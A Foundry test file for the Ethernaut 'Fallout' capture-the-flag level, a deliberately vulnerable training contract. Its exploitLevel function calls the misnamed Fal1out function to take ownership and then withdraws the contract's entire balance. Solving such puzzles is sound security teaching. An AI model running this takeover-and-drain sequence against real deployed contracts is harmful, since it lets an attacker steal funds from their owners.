// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Fallout} from "../../src/02/Fallout.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {FalloutFactory} from "src/02/FalloutFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract FalloutTest is Test, BaseTest {
    Fallout public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new FalloutFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();

        instanceContract = Fallout(instance);
    }

    function testRevertsIfNotCorrectOwnerOfFallbackContract() public {
        vm.expectRevert(abi.encodePacked("caller is not the owner"));
        instanceContract.collectAllocations();
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {

        vm.startPrank(player);

        instanceContract.Fal1out{value: 1 wei}();
        instanceContract.collectAllocations();

        vm.stopPrank();

        assert(instanceContract.owner() == player);
        assertEq(address(instanceContract).balance, 0);
    }
}
